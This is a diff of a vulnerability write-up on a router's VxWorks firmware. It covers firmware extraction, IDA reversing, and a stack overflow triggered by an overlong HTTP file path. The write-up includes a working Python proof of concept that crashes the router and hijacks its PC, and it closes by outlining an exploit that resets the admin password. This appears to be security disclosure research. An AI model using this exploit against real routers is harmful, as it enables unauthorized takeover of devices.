@@ -1,87 +1,84 @@
 ### Analysis
 
+Use binwalk to analyze the firmware.
 ```
-binwalk ./MX25L8005_20230813_224125.BIN
+$ binwalk ./MX25L8005_20230813_224125.BIN
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+13664         0x3560          U-Boot version string, "U-Boot 1.1.4 (Aug 28 2014 - 18:04:52)"
+13712         0x3590          CRC32 polynomial table, big endian
+14996         [0x3A94]          uImage header, header size: 64 bytes, header CRC: 0xEBE5C5A2, created: invalid timestamp, image size: [37958] bytes, Data Address: 0x80010000, Entry Point: [0x80010000], data CRC: 0x9BE8162C, OS: Linux, CPU: MIPS, image type: Firmware Image, compression type: lzma, image name: "u-boot image"
+15060         0x3AD4          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 100568 bytes
+61440         0xF000          IMG0 (VxWorks) header, size: 794144
+61568         0xF080          Wind River management filesystem, compressed, 165 files
+69532         0x10F9C         LZMA compressed data, properties: 0x5A, dictionary size: 8388608 bytes, uncompressed size: 10345 bytes
+...
+```
+We can see that there is a uimage with a header at 0x3A94, a uImage (uboot image) of size 37958, and a loaded address of 0x80010000, and processor architecture mips (big endian). So we dump the uboot and decompress it.
+```
+$ dd if=MX25L8005_20230813_224125.BIN of=uboot.bin.lzma $ $ bs=1 skip=$((0x3A94 + 64)) count=37958
+$ lzma -d ./uboot.bin.lzma
 ```
 
-2.
-
+Using IDA to analyze uboot.bin
 ```
-dd if=MX25L8005_20230813_224125.BIN of=uboot.bin.lzma bs=1 skip=$((0x3A94 + 64)) count=37958
-lzma -d ./uboot.bin.lzma
-```
-
-3. 
-
-```
-IDA -> mips big endian
-
-load address = 0x80010000
-rom address = 0x80010000
-
-
-IDA -> Options -> General -> Analysis -> Processor specific analysis options -> $gp value
-gp = 0x800282D0
+a. 
+  IDA -> mips big endian
+b.
+  load address = 0x80010000
+  rom address = 0x80010000
+c.
+  IDA -> Options -> General -> Analysis -> Processor specific analysis options -> $gp value = 0x800282D0
+d.
+  import idc
+  for ea in range(0x800282D0, 0x800288D7, 4):
+    idc.del_items(ea)
+    idc.create_dword(ea)
 ``` 
-
-
+![](./img/1.png)
+Reverse uboot.bin to analyze the location of the vxwork firmware.
+![](./img/2.png)
+Then dump the vxwork firmware.
 ```
-import idc
-for ea in range(0x800282D0, 0x800288D7, 4):
-  idc.del_items(ea)
-  idc.create_dword(ea)
+$ dd if=MX25L8005_20230813_224125.BIN of=vxworks.bin.lzma bs=1 skip=$((0x4a680)) count=$((0x8671d))
+$ lzma -d ./vxworks.bin.lzma
 ```
+Reverse and analyze vxworks.bin then dig for vulnerabilities.
 
-4. 
 
+### Bug
+
+The reason for the vulnerability is that when going to the file system to fetch a file, an overflow can occur when the file path is too long. The overflow overwrites the PC value.
+
+Proof of concept
 ```
-eth1 up
-eth0, eth1
-Setting 0x181162c0 to 0x4b97a100
-Hit any key to stop autoboot:  0
-vxWorks.bin from =0x4a680, len=0x8671d
-Uncompressing...done
-```
+import socket
+import struct
 
-5.
+from socket import htonl, htons
 
-```
-int sub_80010718()
-{
-  int v0; // $s1
-  int v1; // $s0
-  int v3; // [sp+18h] [-8Ch] BYREF
-  char v4[128]; // [sp+1Ch] [-88h] BYREF
+PORT = 80
+IP   = "192.168.1.1"
+p32  = lambda n   : struct.pack('>I', n)
 
-  v3 = 0x1000000;
-  bzero(v4, 0, 0x80u);
-  memcopy(v4, (char *)0x9F00F000, 0x80);
-  if ( *(_DWORD *)v4 == 'IMG0' )
-  {
-    if ( *(_DWORD *)&v4[4] < 0x180001u )
-    {
-      v0 = *(_DWORD *)&v4[0x54];
-      v1 = *(_DWORD *)&v4[0x50] + 0xF000;
-      sub_80013588("vxWorks.bin from =0x%x, len=0x%x\n", *(_DWORD *)&v4[0x50] + 0xF000, *(_DWORD *)&v4[84]);
-      ...
-}
-
-0000f000  49 4d 47 30 00 0c 1e 20  03 00 02 10 00 00 00 00  |IMG0... ........|
-0000f010  5a 01 03 0d 00 00 00 00  00 00 00 00 00 00 00 00  |Z...............|
-0000f020  00 00 00 02 00 00 00 00  00 00 00 00 00 00 00 00  |................|
-0000f030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
-0000f040  00 00 00 80 00 03 b1 1c  00 03 b1 a0 00 00 04 d8  |................|
-0000f050  00 03 b6 80 00 08 67 1d  00 00 00 00 00 00 00 00  |......g.........|
-0000f060  00 0c 1d a0 00 00 00 80  00 00 00 00 00 00 00 00  |................|
-0000f070  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
-0000f080  6f 77 6f 77 6f 77 6f 77  6f 77 6f 77 6f 77 6f 77  |owowowowowowowow|
-
+io = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+io.connect((IP, PORT))
+request = b'' \
++ b'GET /login/' + b'A'*0x109 + p32(0x12345678) + b'/arc.gif HTTP/1.1\r\n' \
++ b'Host: 192.168.1.1\r\n' \
++ b'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36\r\n' \
++ b'\r\n'
+io.send(request)
+io.recv(4096)
+io.close()
 ```
 
-6. 
-```
+Running this Poc, the router Crash and is hijacked to 0x12345678. this suggests that the excessively long file path triggered a stack overflow.
 
-dd if=MX25L8005_20230813_224125.BIN of=vxworks.bin.lzma bs=1 skip=$((0x4a680)) count=$((0x8671d))
-lzma -d ./vxworks.bin.lzma
-```
+![](./img/7.png)
+
+
+### Attack
+
+Construct a utilization script that changes the value of the password in memory to admin (the default), triggering the router to reset the password.
 
